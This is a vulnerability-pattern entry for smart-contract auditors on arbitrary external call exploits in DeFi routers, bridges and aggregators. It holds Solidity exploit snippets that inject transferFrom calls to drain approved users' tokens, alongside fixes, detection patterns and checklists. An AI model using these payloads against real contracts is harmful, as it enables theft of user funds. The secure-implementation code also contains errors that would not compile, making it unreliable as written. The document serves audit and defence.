---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, bsc"
category: "arbitrary_call"
vulnerability_type: "unvalidated_external_call, input_validation_bypass, calldata_injection"

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: unvalidated_external_call | swap_router | logical_error | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "logical_error"
affected_component: "swap_router, bridge_gateway, aggregator_proxy, diamond_facet, settlement"

# Technical Primitives
primitives:
  - "arbitrary_call"
  - "unvalidated_callTo"
  - "unvalidated_callData"
  - "transferFrom_injection"
  - "swapExtraData"
  - "OPERATION_CALL"
  - "diamond_facet"
  - "yul_overflow"
  - "calldata_corruption"
  - "approval_exploitation"
  - "bridge_signer_validation"
  - "multi_sig_bypass"
  - "flash_loan_callback"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.9
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "add"
  - "call"
  - "callTo"
  - "permit"
  - "approve"
  - "safeAdd"
  - "callData"
  - "swapData"
  - "withdraw"
  - "routeData"
  - "msg.sender"
  - "settlement"
  - "executeSwap"
  - "getCallData"
  - "interaction"
path_keys:
  - "unvalidated_callto_calldata_in_swap_route_structs"
  - "unrestricted_external_call_actions_operation_call"
  - "bridge_signer_validation_bypass"
  - "yul_integer_overflow_calldata_corruption"
  - "unverified_aggregator_proxy_forwarding"

# Context Tags
tags:
  - "defi"
  - "bridge"
  - "aggregator"
  - "router"
  - "arbitrary_call"
  - "input_validation"
  - "approval_exploit"
  - "transferFrom"
  - "diamond"
  - "yul"
  - "calldata"
  - "settlement"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [ORBIT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-01/OrbitChain_exp.sol` |
| [LIFI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-07/Lifiprotocol_exp.sol` |
| [SENECA-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-02/Seneca_exp.sol` |
| [1INCH-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-03/1inchFusionV1_exp.sol` |
| [SOCKET-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-01/SocketGateway_exp.sol` |
| [UNIZEN-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-03/UnizenIO_exp.sol` |
| [DOUGH-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2024-07/DoughFina_exp.sol` |

---

# Arbitrary External Call & Input Validation Attack Patterns (2024-2025)
## Overview

Arbitrary external call and input validation bypasses are the highest-impact single-category exploit in 2024-2025, causing over **$108M** in combined losses. The core vulnerability is consistent: contracts execute user-controlled external calls (target address + calldata) without validating that the destination and function selector are safe. Since users grant token approvals to these contracts (routers, bridges, aggregators), attackers weaponize those approvals via injected `transferFrom(victim, attacker, amount)` calls. Patterns include unvalidated `callTo`/`callData` in swap structs (LiFi $10M, SocketGateway $3.3M), unrestricted OPERATION_CALL actions (Seneca $6M, DoughFina $1.8M), compromised bridge signer validation (OrbitChain $81M), Yul integer overflow calldata corruption (1inch $4.5M), and unverified aggregator proxy forwarding (UnizenIO $2M).

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `unvalidated_external_call | swap_router | logical_error | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, arbitrum, bsc |


## 1. Unvalidated callTo/callData in Swap/Route Structs

> **pathShape**: `atomic`

### Root Cause

Many DeFi protocols (routers, aggregators, bridges) accept user-supplied swap instructions containing a `callTo` (target address) and `callData` (raw bytes) field. When these are forwarded directly into a low-level `call()` without validation, an attacker can set `callTo = token_address` and `callData = abi.encodeWithSelector(transferFrom.selector, victim, attacker, amount)`. If the victim has approved the protocol contract, the `transferFrom` succeeds — the contract effectively steals the victim's tokens on behalf of the attacker.

### Attack Scenario

1. Identify a protocol with user approvals (router, aggregator, bridge gateway)
2. Find a function that passes user-supplied `callTo`/`callData` to a low-level call
3. Encode `transferFrom(victim, attacker, balance)` as the callData
4. Set `callTo` to the target token contract address
5. Call the vulnerable function — contract executes `token.transferFrom(victim, attacker, balance)`
6. Repeat for each victim who has approved the contract

### Vulnerable Pattern Examples

**Example 1: LiFi Protocol — Unvalidated callTo in SwapData ($10M, Jul 2024)** [Approx Vulnerability: CRITICAL] `@audit` [LIFI-POC]

```solidity
// ❌ VULNERABLE: depositToGasZipERC20 passes SwapData.callTo directly to call()
// LiFi Diamond facet does: _swapData.callTo.call(_swapData.callData)

LibSwap.SwapData memory swapData = LibSwap.SwapData({
    callTo: address(USDT),                     // @audit Target: USDT token contract
    approveTo: address(this),
    sendingAssetId: address(attackerFakeToken), // Fake token (bypasses initial checks)
    receivingAssetId: address(attackerFakeToken),
    fromAmount: 1,
    callData: abi.encodeWithSelector(
        bytes4(0x23b872dd),                    // @audit transferFrom selector
        address(Victim),                        // from: victim who approved LiFi
        address(this),                          // to: attacker
        2_276_295_880_553                       // amount: victim's full USDT balance
    ),
    requiresDeposit: true
});

// @audit LiFi Diamond executes: USDT.transferFrom(victim, attacker, balance)
Vulncontract.depositToGasZipERC20(swapData, 0, address(this));
// $10M drained across multiple victims who had approved LiFi
```

**Example 2: SocketGateway — Unvalidated swapExtraData in Route ($3.3M, Jan 2024)** [Approx Vulnerability: CRITICAL] `@audit` [SOCKET-POC]

```solidity
// ❌ VULNERABLE: Newly added route (ID 406) passes swapExtraData to low-level call
// performAction(fromToken, toToken, amount, receiver, metadata, swapExtraData)

function getCallData(address token, address user) internal view returns (bytes memory) {
    return abi.encodeWithSelector(
        IERC20.transferFrom.selector,
        user,                                  // @audit victim address
        address(this),                         // @audit attacker address
        IERC20(token).balanceOf(user)           // @audit drain entire balance
    );
}

function getRouteData(address token, address user) internal view returns (bytes memory) {
    return abi.encodeWithSelector(
        ISocketVulnRoute.performAction.selector,
        token, token, 0, address(this), bytes32(""),
        getCallData(_usdc, user)               // @audit Injected transferFrom as swapExtraData
    );
}

// @audit Route handler executes: token.call(swapExtraData)
gateway.executeRoute(routeId, getRouteData(_usdc, targetUser));
// @audit Batch exploitation possible across ALL users who approved SocketGateway
```

---

## 2. Unrestricted External Call Actions (OPERATION_CALL)

> **pathShape**: `callback-reentrant`

### Root Cause

Multi-action contracts (like Kashi/Chamberss) implement an `OPERATION_CALL` action type that allows calling arbitrary external contracts. When there is no whitelist on target addresses or function selectors, any user can make the contract execute arbitrary calls — including `transferFrom()` calls targeting users who have approved the contract, or calls to manipulate other DeFi positions.

### Vulnerable Pattern Examples

**Example 3: Seneca — Unrestricted OPERATION_CALL ($6M, Feb 2024)** [Approx Vulnerability: CRITICAL] `@audit` [SENECA-POC]

```solidity
// ❌ VULNERABLE: Chamber.performOperations() has OPERATION_CALL (opcode 30)
// No whitelist on target addresses or function selectors

uint8 public constant OPERATION_CALL = 30;

// Encode arbitrary transferFrom targeting victim
bytes memory callData = abi.encodeWithSignature(
    "transferFrom(address,address,uint256)",
    victim,                    // @audit From: user who approved Chamber
    address(this),             // @audit To: attacker
    amount                     // @audit Amount: victim's full balance
);
bytes memory data = abi.encode(
    address(PendlePrincipalToken),  // @audit Target: any token contract
    callData,                       // @audit Payload: transferFrom
    0, 0, 0
);

// @audit Chamber executes: PendlePrincipalToken.transferFrom(victim, attacker, amount)
Chamber.performOperations([OPERATION_CALL], [0], [data]);
// @audit $6M drained — generic call gadget with no restrictions
```

**Example 4: DoughFina — Unvalidated swapData in Flashloan Callback ($1.8M, Jul 2024)** [Approx Vulnerability: CRITICAL] `@audit` [DOUGH-POC]

```solidity
// ❌ VULNERABLE: Deleverage connector forwards user-supplied swapData
// to external calls without validating targets or selectors

// Step 1: Repay victim's Aave debt to free collateral
aave.repay(address(USDC), 938_566_826_811, 2, address(onBehalfOf));

// Step 2: swapData[0] triggers collateral withdrawal from victim's Aave position
bytes[] memory swapData = new bytes[](2);
swapData[0] = abi.encode(
    USDC, USDC, type(uint128).max, type(uint128).max,
    address(onBehalfOf), address(onBehalfOf),
    abi.encodeWithSelector(0x75b4b22d, 22, USDC, 5_000_000, WETH, 596_744_648_055_377_423_623, 2)
);
// @audit Frees victim's WETH collateral from Aave position

// Step 3: swapData[1] steals the freed WETH via transferFrom
swapData[1] = abi.encode(
    USDC, USDC, type(uint128).max, type(uint128).max,
    address(WETH), address(aave),
    abi.encodeWithSelector(
        0x23b872dd,                             // @audit transferFrom
        onBehalfOf,                             // @audit victim
        address(this),                          // @audit attacker
        596_744_648_055_377_423_623             // @audit victim's WETH balance
    )
);

// @audit Connector forwards both swapData entries as external calls
vulnContract.flashloanReq(false, debtTokens, debtAmounts, debtRateMode, collateralTokens, collateralAmounts, swapData);
// @audit $1.8M drained via 2-step: free collateral, then transferFrom
```

---

## 3. Bridge Signer Validation Bypass

> **pathShape**: `atomic`

### Root Cause

Cross-chain bridges use multi-signature validation on withdrawal requests — requiring N of M authorized validators to sign. When the signer verification is insufficient (e.g., using compromised keys, insufficient nonce protection, or weak signature validation), an attacker can forge withdrawal requests with crafted signatures and drain the bridge vault.

### Vulnerable Pattern Examples

**Example 5: OrbitChain — Forged Multi-Sig Signatures ($81M, Jan 2024)** [Approx Vulnerability: CRITICAL] `@audit` [ORBIT-POC]

```solidity
// ❌ VULNERABLE: Bridge withdraw() accepts invalid/compromised validator signatures
// Multi-sig verification was insufficient to prevent forged withdrawals

interface IOrbitBridge {
    function withdraw(
        address hubContract, string memory fromChain, bytes memory fromAddr,
        address toAddr, address token, bytes32[] memory bytes32s,
        uint256[] memory uints, bytes memory data,
        uint8[] memory v, bytes32[] memory r, bytes32[] memory s
    ) external;
}

// Attacker constructs withdrawal with 7 forged signatures
bytes32[] memory bytes32s = new bytes32[](2);
bytes32s[0] = sha256(abi.encodePacked(hubContract, chain, vault));
bytes32s[1] = orbitTxHash;  // @audit Fake orbit-chain tx hash

// @audit 7 forged v/r/s signature tuples pass the multi-sig check
OrbitEthVault.withdraw(
    hubContract, "ORBIT", fromAddr, toAddr, WBTC,
    bytes32s, uints, "",
    v, r, s
);
// @audit Repeat for WETH, USDT, DAI, USDC
// @audit $81M drained across 5 token types
// Root cause: compromised validator keys or insufficient signer validation
```

---

## 4. Yul Integer Overflow Calldata Corruption

> **pathShape**: `atomic`

### Root Cause

Contracts using Yul assembly for calldata manipulation are vulnerable to integer overflow, as Yul's `add()` opcode does NOT revert on overflow (unlike Solidity 0.8+). An attacker can craft a fake `interactionLength` that, when added to offsets in Yul, wraps around and overwrites calldata memory — redirecting function calls to use attacker-controlled parameters instead of the original values.

### Vulnerable Pattern Examples

**Example 6: 1inch Fusion V1 — Yul Calldata Overflow ($4.5M, Mar 2025)** [Approx Vulnerability: CRITICAL] `@audit` [1INCH-POC]

```solidity
// ❌ VULNERABLE: Settlement._settleOrder() uses Yul add() for calldata offsets
// Yul add() wraps on overflow instead of reverting

// The overflow trick — crafted interactionLength:
uint256 FAKE_INTERACTION_LENGTH = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00;
// @audit This is -512 as int256 — but Yul treats it as uint256

// In Yul, _settleOrder does:
// mstore(add(add(ptr, interactionLengthOffset), 4),
//        add(interactionLength, suffixLength))
// → add(0xffff...fe00, 0x200) = 0  (overflow!) → sets interaction length to 0

// For the write offset:
// let offset := add(add(ptr, interactionOffset), interactionLength)
// → ptr + interactionOffset + 0xffff...fe00 → wraps BACKWARD in memory
// → attacker's suffix data overwrites the copied calldata

// Attack uses "ping-pong" orders (orders 1→2→3→4→5) to grow tokensAndAmounts
// Then 6th order uses overflow to rewrite calldata:
bytes memory dynamicSuffix = abi.encode(
    0,
    VICTIM,             // @audit Victim's address injected as funds source
    USDC,
    0, 0, USDC,
    AMOUNT_TO_STEAL,    // @audit Amount to drain
    0x40
);

bytes memory finalOrderInteraction = abi.encodePacked(
    SettlementAddr,
    _FINALIZE_INTERACTION,
    VICTIM,
    suffixPadding,
    dynamicSuffix       // @audit This data lands INSIDE the copied calldata
);

// @audit fillOrderTo() executes with corrupted calldata:
// Uses victim's address as the source of funds instead of the order creator
// @audit $4.5M stolen (1M USDC per transaction × multiple victims)
```

---

## 5. Unverified Aggregator Proxy Forwarding

> **pathShape**: `atomic`

### Root Cause

Trade aggregator proxies that accept raw calldata and forward it to external contracts create a universal call gadget. When the proxy holds user approvals (standard for aggregators), an attacker encodes a `transferFrom(victim, proxy, amount)` call inside the aggregator's execution path. The proxy has sufficient approval to execute the transfer on the victim's behalf.

### Vulnerable Pattern Examples

**Example 7: UnizenIO — Unverified Proxy External Call ($2M, Mar 2024)** [Approx Vulnerability: CRITICAL] `@audit` [UNIZEN-POC]

```solidity
// ❌ VULNERABLE: Unverified aggregator proxy at 0xd3f64BAa732061F8B3626ee44bab354f854877AC
// Function selector 0x1ef29a02 forwards raw calldata to external contracts

vm.startPrank(attacker);
// @audit Raw calldata contains embedded transferFrom(victim, proxy, amount)
aggregator_proxy.call{value: 1}(
    hex"1ef29a02..."
    // Decoded payload contains:
    //   0x23b872dd = transferFrom selector
    //   victim: 0x7feAeE6094B8B630de3f7202d04C33f3BDC3828a
    //   to: 0xd3f64BAa732061F8B3626ee44bab354f854877AC  // proxy itself
    //   amount: 0x23128cfbd15ed72f6
);
// @audit Proxy executes DMTR.transferFrom(victim, proxy, amount)
// Then attacker calls again to transfer from proxy to attacker

// @audit Contract code wasn't even verified on Etherscan
// @audit $2M drained from users who approved the unverified aggregator
```

---

## Impact Analysis

### Technical Impact
- Any user who has approved the vulnerable contract can be drained in a single transaction
- Batch exploitation drains ALL approved users — not just one
- Approval-based attacks require no flash loans or complex setup
- Yul overflow enables calldata corruption that bypasses Solidity-level safety checks
- Bridge signer bypass drains the entire bridge vault across all supported tokens
- Unverified contracts provide zero transparency for users to audit safety

### Business Impact
- **OrbitChain**: $81M loss — compromised bridge validator signatures
- **LiFi Protocol**: $10M loss — unvalidated callTo in diamond facet SwapData
- **Seneca**: $6M loss — unrestricted OPERATION_CALL in Chamber contract
- **1inch Fusion V1**: $4.5M loss — Yul overflow corrupted settlement calldata
- **SocketGateway**: $3.3M loss — unvalidated swapExtraData in new route
- **UnizenIO**: $2M loss — unverified aggregator proxy forwarded arbitrary calls
- **DoughFina**: $1.8M loss — unvalidated swapData in flashloan connector
- Combined 2024-2025 arbitrary call damage: **$108M+**

### Affected Scenarios
- DEX aggregators accepting user-supplied swap targets and calldata
- Bridge gateways with multi-sig withdrawal validation
- Diamond proxy facets with swap/route execution
- Lending protocols with multi-action operations (OPERATION_CALL)
- Settlement contracts using Yul assembly for calldata manipulation
- Any contract holding user ERC20 approvals with unvalidated external calls

---

## Secure Implementation

**Fix 1: Whitelist Target Addresses and Function Selectors**
```solidity
// ✅ SECURE: Only allow calls to whitelisted targets with approved selectors
mapping(address => bool) public allowedTargets;
mapping(bytes4 => bool) public allowedSelectors;

function executeSwap(SwapData calldata swapData) external {
    require(allowedTargets[swapData.callTo], "Target not whitelisted");

    bytes4 selector = bytes4(swapData.callData[:4]);
    require(allowedSelectors[selector], "Selector not whitelisted");

    // @audit Block transferFrom, approve, and other dangerous selectors
    require(selector != IERC20.transferFrom.selector, "transferFrom blocked");
    require(selector != IERC20.approve.selector, "approve blocked");

    (bool success,) = swapData.callTo.call(swapData.callData);
    require(success, "Swap failed");
}
```

**Fix 2: Validate msg.sender === Funds Source**
```solidity
// ✅ SECURE: Ensure caller is the source of funds
function performOperations(
    uint8[] memory actions, uint256[] memory values, bytes[] memory datas
) external {
    for (uint256 i = 0; i < actions.length; i++) {
        if (actions[i] == OPERATION_CALL) {
            (address target, bytes memory callData,,,,) = abi.decode(datas[i], (address, bytes, uint256, uint256, uint256));

            // @audit Extract the first parameter (from address) from callData
            // Ensure it equals msg.sender — no acting on behalf of others
            bytes4 selector = bytes4(callData[:4]);
            if (selector == IERC20.transferFrom.selector) {
                address from = abi.decode(callData[4:36], (address));
                require(from == msg.sender, "Cannot transfer from other users");
            }
        }
    }
}
```

**Fix 3: Checked Arithmetic in Yul Assembly**
```solidity
// ✅ SECURE: Use checked addition in Yul for calldata offsets
assembly {
    function safeAdd(a, b) -> result {
        result := add(a, b)
        // @audit Check for overflow — revert if result < either operand
        if lt(result, a) { revert(0, 0) }
    }

    let totalLength := safeAdd(interactionLength, suffixLength)
    let offset := safeAdd(safeAdd(ptr, interactionOffset), interactionLength)
    // @audit Overflow now reverts instead of wrapping
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Pattern 1: `target.call(userSuppliedCallData)` — arbitrary external call
- Pattern 2: `swapData.callTo.call(swapData.callData)` — unvalidated swap target
- Pattern 3: `OPERATION_CALL` or similar generic call actions in multi-action contracts
- Pattern 4: `swapExtraData` / `routeData` / `interaction` bytes passed to external calls
- Pattern 5: Yul `add()` operations on user-supplied values (no overflow check)
- Pattern 6: Bridge `withdraw()` with signature verification — check signer validation
- Pattern 7: Aggregator proxy with unverified source code holding token approvals
```

### Audit Checklist
- [ ] Does the contract execute any user-supplied external calls?
- [ ] Are call targets whitelisted? Are function selectors filtered?
- [ ] Is `transferFrom` / `approve` blocked in user-supplied calldata?
- [ ] Does the contract hold ERC20 approvals from users?
- [ ] Are Yul arithmetic operations checked for overflow?
- [ ] Is bridge signer validation using proper nonce, chain ID, and signer set?
- [ ] Is the contract source code verified and auditable on block explorers?
- [ ] Can `msg.sender` act on behalf of other users' funds?

---

## Real-World Examples

### Known Exploits
- **OrbitChain** — $81M — Compromised/forged bridge validator signatures — Jan 2024
- **LiFi Protocol** — $10M — Unvalidated callTo in SwapData diamond facet — Jul 2024
- **Seneca** — $6M — Unrestricted OPERATION_CALL action — Feb 2024
- **1inch Fusion V1** — $4.5M — Yul integer overflow corrupted settlement calldata — Mar 2025
- **SocketGateway** — $3.3M — Unvalidated swapExtraData in route 406 — Jan 2024
- **UnizenIO** — $2M — Unverified aggregator proxy with arbitrary forwarding — Mar 2024
- **DoughFina** — $1.8M — Unvalidated swapData in flashloan deleverage callback — Jul 2024

---

## Prevention Guidelines

### Development Best Practices
1. Never pass user-controlled calldata to low-level `call()` without whitelisting
2. Maintain a strict allowlist of callable target addresses and function selectors
3. Specifically block `transferFrom`, `approve`, `permit` selectors in user-controlled calls
4. Use checked arithmetic (Solidity 0.8+) in all assembly blocks — never trust `add()` in Yul
5. Verify bridge signer sets with proper nonce management and chain ID binding
6. Always verify contract source code on block explorers before deployment
7. Implement approval limits — don't require `type(uint256).max` approvals
8. Use permit-based one-time approvals instead of persistent allowances where possible

### Testing Requirements
- Unit tests for: injected `transferFrom` calldata in all user-supplied bytes parameters
- Integration tests for: batch call operations with OPERATION_CALL targeting other users
- Fuzzing targets: Yul arithmetic overflow in assembly blocks with user-controlled input
- Security tests: verify all external call targets are whitelisted

---

## Keywords for Search

`arbitrary call`, `unvalidated external call`, `callTo`, `callData`, `swapExtraData`, `transferFrom injection`, `approval exploitation`, `OPERATION_CALL`, `diamond facet`, `route handler`, `aggregator proxy`, `bridge signer`, `multi-sig bypass`, `validator signatures`, `Yul overflow`, `calldata corruption`, `integer overflow assembly`, `unverified contract`, `low-level call`, `call gadget`, `input validation`, `performOperations`, `executeRoute`, `depositToGasZipERC20`, `flashloanReq`, `swapData`, `settlement`, `ping-pong orders`

---

## Related Vulnerabilities

- `DB/general/arbitrary-call/defihacklabs-arbitrary-call-patterns.md` — Earlier arbitrary call patterns (2022-2023)
- `DB/bridge/custom/defihacklabs-bridge-patterns.md` — Bridge vulnerability patterns
- `DB/general/missing-validations/defihacklabs-input-validation-patterns.md` — Input validation patterns
- `DB/general/signature/` — Signature validation vulnerabilities
